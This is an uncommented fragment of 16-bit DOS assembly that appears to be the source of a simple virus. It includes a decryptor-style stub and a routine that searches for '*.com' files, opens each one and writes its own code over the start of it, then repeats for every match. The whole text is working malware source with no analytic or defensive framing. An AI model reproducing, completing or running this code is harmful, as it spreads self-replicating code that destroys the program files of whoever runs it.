@StartCode equ $-start
StartCode:
           mov bp,100h
           mov cx,(@@EndCode / 2) + 1
@@SC1 equ $-StartCode
           lea di,[bp+1234h]
           mov si,di
@@SC2 equ $-StartCode
           mov bx,1234h
@@StartCode equ $-StartCode

@EndCode equ $-start
EndCode:
           call $+3
           pop bp
           sub bp,3
           mov al,0e9h
           mov di,100h
           stosb
           mov ax,bp
           sub ax,3
           dec ah
           stosw
           mov ah,4eh
           lea dx,[bp+MaskF]
           mov cx,0feh
Int_Vir:
           int 21h
           jb No_Vir
           mov ax,3d02h
           mov dx,9eh
           int 21h
           xchg bx,ax
           mov ah,40h
           mov dx,100h
           lea cx,[bp+@@EndCode]
           dec ch
           int 21h
           mov ah,3eh
           int 21h
           mov ah,4fh
           jmp short Int_Vir
No_Vir:
           int 20h
MaskF equ $-EndCode
db '*.com',0h,90h,90h
@@EndCode equ $-EndCode
